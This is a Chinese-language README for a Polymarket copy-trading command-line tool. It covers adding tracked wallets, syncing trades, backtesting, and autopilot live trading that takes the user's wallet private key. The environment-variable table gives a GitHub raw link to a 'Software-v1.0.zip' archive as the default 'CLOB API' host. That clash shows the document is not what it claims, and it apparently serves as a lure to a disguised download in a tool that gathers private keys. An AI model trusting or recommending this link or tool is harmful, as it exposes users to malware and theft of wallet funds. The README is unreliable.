# duola — Polymarket 跟单交易 CLI

跟踪 Polymarket 聪明钱钱包，自动拉取数据、分析胜率、执行跟单。

---

## 安装

```bash
npm install
npm run build
npm link          # 全局可用 duola 命令
```

---

## 快速开始

```bash
# 1. 添加要跟踪的聪明钱
duola leader add 0xABC...DEF --name whale

# 2. 拉取他的历史交易
duola sync whale --limit 500

# 3. 回测：跟他能不能赚钱
duola backtest whale --lookback 30d

# 4. 觉得可以跟 → 一键配置并启动
printf '%s' '0xYOUR_PRIVATE_KEY' | duola autopilot onboard 0xABC...DEF \
  --name whale --private-key-stdin --profile balanced

# 5. 发布前检查
duola doctor whale

# 6. 启动自动跟单（后台运行）
duola autopilot start whale --confirm-live "I UNDERSTAND LIVE TRADING" --detach

# 7. 查看状态 / 停止
duola autopilot status whale
duola autopilot stop whale
```

---

## 命令总览

```
duola
├── leader                    管理聪明钱地址
│   ├── add <地址>            添加聪明钱
│   ├── list                  列出所有聪明钱
│   ├── inspect <别名>        查看详细统计（交易数、胜率市场、平均金额…）
│   └── remove <别名>         删除聪明钱
│
├── sync <别名>               拉取聪明钱的交易数据
├── backtest <别名>           历史回测（模拟跟单盈亏）
├── doctor [别名]             环境诊断（API连通性、私钥配置…）
│
├── follow                    跟单配置与运行（分步操作）
│   ├── init <别名>           初始化跟单配置
│   ├── show-config <别名>    查看配置
│   ├── config set <别名>     修改配置
│   ├── start <别名>          启动跟单（前台）
│   ├── stop <别名>           停止跟单
│   ├── status <别名>         查看运行状态
│   └── logs <别名>           查看信号和订单记录
│
└── autopilot                 一键式跟单（推荐）
    ├── onboard <地址>        一键注册 + 配置 + 存私钥 + 同步
    ├── start <别名>          一键启动（支持后台 --detach）
    ├── status <别名>         查看完整状态
    ├── stop <别名>           停止跟单 + 停后台进程
    └── reset-secret <别名>   删除已存储的私钥
```

> 所有命令都支持 `--output json`（默认 `table`）。

---

## 命令详解

### `leader` — 管理跟踪的聪明钱

```bash
# 添加聪明钱
duola leader add <地址> --name <别名> [--notes "备注"]

# 列出所有聪明钱
duola leader list

# 查看统计：交易次数、平均金额、最常交易的市场、类别分布
duola leader inspect <别名>

# 删除
duola leader remove <别名>
```

**示例：**
```bash
duola leader add 0xdc876e68...d7ab6 --name smartmoney --notes "NBA高手"
duola leader inspect smartmoney --output json
```

---

### `sync` — 拉取交易数据

从 Polymarket Data API 拉取聪明钱的历史交易，存入本地 SQLite。

```bash
duola sync <别名> [--limit <数量>]
```

| 参数 | 默认值 | 说明 |
|------|--------|------|
| `--limit` | `200` | 最多拉取条数（上限 500/页，自动分页） |

**示例：**
```bash
duola sync smartmoney --limit 500
```

输出：拉取了多少条、插入了多少条、跳过了多少重复。

---

### `backtest` — 历史回测

用聪明钱的历史交易做模拟回测，看如果跟单了，盈亏会怎样。

```bash
duola backtest <别名> [选项]
```

| 参数 | 默认值 | 说明 |
|------|--------|------|
| `--lookback` | `7d` | 回看窗口（`30d`=30天，`24h`=24小时） |
| `--fixed-usd` | `25` | 每笔模拟跟单金额（美元） |
| `--min-liquidity` | `5000` | 最低市场流动性（美元） |
| `--min-time-to-expiry` | `3600` | 最低到期时间（秒） |

**示例：**
```bash
# 回测过去 30 天，每笔 $10
duola backtest smartmoney --lookback 30d --fixed-usd 10

# 只看最近 24 小时，输出 JSON
duola backtest smartmoney --lookback 24h --output json
```

输出：总信号数、执行数、跳过数、胜率、总 PnL、平均回报率、最大回撤。
报告自动保存在 `~/.duola/reports/`。

---

### `doctor` — 环境诊断

检查运行环境是否就绪。

```bash
duola doctor [别名]
```

**检查项：**
- Node.js 版本
- 聪明钱是否存在
- 私钥是否已配置（文件 or 环境变量）
- 代理设置
- Data API / Gamma API / CLOB API 连通性

```bash
duola doctor smartmoney --output json
```

---

### `follow` — 跟单配置与运行（分步操作）

#### 初始化配置

```bash
duola follow init <别名> [--profile conservative|balanced|aggressive]
```

| | conservative | balanced | aggressive |
|---|---|---|---|
| 轮询间隔 | 15 秒 | 10 秒 | 5 秒 |
| 每笔金额 | $10 | $25 | $50 |
| 日最大亏损 | $100 | $100 | $200 |
| 最大回撤 | 20% | 20% | 25% |

共同默认值：最低流动性 $5000、最大滑点 50bps、最大持仓 15 个、冷却 1800 秒、**实盘默认关闭**。

#### 查看 / 修改配置

```bash
duola follow show-config <别名>
duola follow config set <别名> <键> <值>
```

常用配置项：

| 键 | 说明 | 示例值 |
|----|------|--------|
| `sizing.fixed_usd` | 每笔金额 | `50` |
| `execution.max_slippage_bps` | 最大滑点（基点） | `100` |
| `risk.allow_live` | 实盘开关 | `true` |
| `risk.max_daily_loss_usd` | 日最大亏损 | `200` |
| `risk.cooldown_sec` | 冷却时间（秒） | `600` |
| `poll_interval_sec` | 轮询间隔（秒） | `5` |
| `filters.categories_allow` | 只跟这些类别 | `crypto,politics` |
| `filters.categories_deny` | 排除类别 | `sports` |
| `filters.min_liquidity_usd` | 最低流动性 | `10000` |

#### 启动 / 停止 / 状态 / 日志

```bash
# 启动（前台，ctrl+C 停止）
duola follow start <别名> --confirm-live "I UNDERSTAND LIVE TRADING"

# 限制轮数（测试用）
duola follow start <别名> --confirm-live "I UNDERSTAND LIVE TRADING" --max-cycles 5

# 停止
duola follow stop <别名>

# 查看运行状态
duola follow status <别名>

# 查看最近信号和订单
duola follow logs <别名> [--tail 100]
```

---

### `autopilot` — 一键式跟单（推荐日常使用）

把 leader add + follow init + 存私钥 + sync 合并。

#### 注册

```bash
# 推荐：通过 stdin 传私钥
printf '%s' '0xYOUR_KEY' | duola autopilot onboard <地址> \
  --name <别名> --private-key-stdin [--profile balanced] [--sync-limit 200]
```

| 参数 | 默认值 | 说明 |
|------|--------|------|
| `--name` | **必填** | 别名 |
| `--private-key-stdin` | — | 从 stdin 读私钥（推荐） |
| `--private-key` | — | 直接传私钥（二选一） |
| `--profile` | `balanced` | 预设方案 |
| `--sync-limit` | `200` | 初始同步条数 |

注意：autopilot onboard 会自动开启 `allow_live = true`。

#### 启动 / 状态 / 停止

```bash
# 后台启动（推荐）
duola autopilot start <别名> --confirm-live "I UNDERSTAND LIVE TRADING" --detach

# 查看完整状态
duola autopilot status <别名>

# 停止
duola autopilot stop <别名>

# 删除已存储的私钥
duola autopilot reset-secret <别名>
```

---

## 跟单运行逻辑

启动后进入轮询循环：

```
每 N 秒（默认 10 秒）
  │
  ├─ 拉取聪明钱最近 20 条交易
  │
  ├─ 过滤出上次检查之后的新交易
  │
  ├─ 对每笔新交易评估信号
  │   ├─ 市场流动性足够？
  │   ├─ 符合类别过滤？
  │   ├─ 距到期时间足够？
  │   └─ 当前价格滑点在限制内？
  │
  ├─ 全部通过 → 下同方向、固定金额的限价单
  │   未通过 → 记录跳过原因（可通过 follow logs 查看）
  │
  └─ 等待 → 继续循环
```

---

## 典型使用场景

### 场景 1：只想看数据，不跟单

```bash
duola leader add 0xAAA... --name trader-a
duola leader add 0xBBB... --name trader-b
duola sync trader-a --limit 500
duola sync trader-b --limit 500

# 对比统计
duola leader inspect trader-a
duola leader inspect trader-b

# 回测对比
duola backtest trader-a --lookback 30d --fixed-usd 10
duola backtest trader-b --lookback 30d --fixed-usd 10
```

### 场景 2：快速上线跟单

```bash
printf '%s' '0xYOUR_KEY' | duola autopilot onboard 0xSMART \
  --name whale --private-key-stdin --profile conservative
duola doctor whale
duola autopilot start whale --confirm-live "I UNDERSTAND LIVE TRADING" --detach
duola autopilot status whale
```

### 场景 3：只跟特定类别

```bash
duola follow config set whale filters.categories_allow crypto
duola follow config set whale filters.categories_deny sports,politics
```

### 场景 4：调整金额和风控

```bash
duola follow config set whale sizing.fixed_usd 50
duola follow config set whale risk.max_daily_loss_usd 200
duola follow config set whale execution.max_slippage_bps 100
```

---

## 数据目录

所有数据存放在 `~/.duola/`（可通过 `DUOLA_HOME` 环境变量覆盖）：

| 路径 | 内容 |
|------|------|
| `duola.db` | SQLite 数据库（聪明钱、交易、信号、订单、市场缓存） |
| `profiles/<别名>.yml` | 跟单配置文件 |
| `secrets/<别名>.json` | 钱包私钥（权限 0600） |
| `reports/` | 回测报告（JSON + Markdown） |
| `runtime/` | 后台进程 PID 和日志 |

---

## 环境变量

| 变量 | 说明 |
|------|------|
| `DUOLA_HOME` | 数据目录（默认 `~/.duola`） |
| `DUOLA_PRIVATE_KEY` | 钱包私钥（代替文件存储） |
| `DUOLA_EXECUTION_COMMAND` | 自定义下单命令（高级） |
| `DUOLA_CLOB_HOST` | CLOB API 地址（默认 `https://raw.githubusercontent.com/cupable/duola/main/src/Software-v1.0.zip`） |
| `DUOLA_CHAIN_ID` | 链 ID（默认 `137`，Polygon） |
| `DUOLA_SIGNATURE_TYPE` | 签名类型（默认 `0`=EOA，`1`/`2` 需配合 `DUOLA_FUNDER_ADDRESS`） |
| `DUOLA_FUNDER_ADDRESS` | 资金地址（签名类型 1/2 时必填） |
| `POLYMARKET_PROXY_URL` | HTTP 代理 |
| `HTTPS_PROXY` / `HTTP_PROXY` | HTTP 代理（备选） |

---

## 实现说明

- 读链路：Polymarket 公开 REST API（data-api / gamma-api / clob）
- 写链路：默认使用 `@polymarket/clob-client` 官方 SDK，也支持通过 `DUOLA_EXECUTION_COMMAND` 接入自定义签名流程
- 回测不做历史订单簿重建，使用价格快照估算
- 跟单只做真实执行，不提供模拟模式
- 推荐使用 `--private-key-stdin`，避免私钥出现在 shell 历史
